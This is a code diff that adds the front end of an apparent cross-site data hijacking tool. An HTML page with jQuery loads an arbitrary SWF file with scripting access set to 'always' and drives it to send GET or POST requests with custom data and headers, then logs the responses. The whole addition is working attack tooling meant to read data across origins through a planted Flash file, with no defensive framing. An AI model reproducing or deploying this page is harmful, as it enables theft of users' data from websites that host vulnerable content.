@@ -7,8 +7,88 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="referrer" content="no-referrer">
     <title>welcome to cross site data hijacking</title>
+    <script src="bower_components/jquery/dist/jquery.js"></script>
+    <style>
+        input {
+            line-height: 20px;
+            margin-bottom: 10px;
+            padding-left: 10px;
+        }
+
+        input[type=text] {
+            width: 500px;
+        }
+
+        button {
+            line-height: 20px;
+            padding-left: 20px;
+            padding-right: 20px;
+        }
+    </style>
 </head>
 <body>
 <h3>cross site data hijacking</h3>
+<input type="text" placeholder="swf url" id="swfURL">
+<button id="injectSWF">load</button>
+<br>
+<br>
+<label for="GET"><input type="radio" name="method" value="GET" id="GET" checked> GET</label>
+<label for="POST"><input type="radio" name="method" value="POST" id="POST"> POST</label>
+<br>
+<input type="text" placeholder="url" id="url" >
+<br>
+<input type="text" placeholder="content-type" id="contentType" value="application/x-www-form-urlencoded">
+<br>
+<input type="text" placeholder="dataObj" id="data"> eg: {"a":1}
+<br>
+<input type="text" placeholder="headersObj" id="headers">
+<button id="request">request</button>
+<br>
+<object id="SWF" width="500" height="500" type="application/x-shockwave-flash">
+    <param name="allowscriptaccess" value="always">
+</object>
+
+<script>
+    function flashReady() {
+        console.log('flash is ready');
+    }
+
+    function request(url, data = null, headers = null, method = 'GET', contentType = 'application/x-www-form-urlencoded', dataFormat = 'text') {
+        console.log(method, url);
+        SWF.request(url, data, headers, method, contentType, dataFormat)
+    }
+
+    function flashResponse(res) {
+        console.log(res);
+    }
+
+    function injectSWF(swfURL) {
+        $('#SWF').attr('data', swfURL);
+    }
+
+    $('#injectSWF').click(function () {
+        let swfURL = $('#swfURL').val();
+        injectSWF(swfURL);
+    });
+
+    $('#request').click(function () {
+        let url = $('#url').val();
+        let method = $('input[name=method]:checked').val();
+        let contentType = $('#contentType').val();
+        let dataStr = $('#data').val();
+        let data;
+        if (dataStr.length > 0) {
+            data = JSON.parse(dataStr);
+        }
+        let headerStr = $('#headers').val();
+        let headers;
+        if (headerStr.length > 0) {
+            headers = JSON.parse(headerStr);
+        }
+        request(url, data, headers, method, contentType)
+    });
+
+
+</script>
 </body>
 </html>
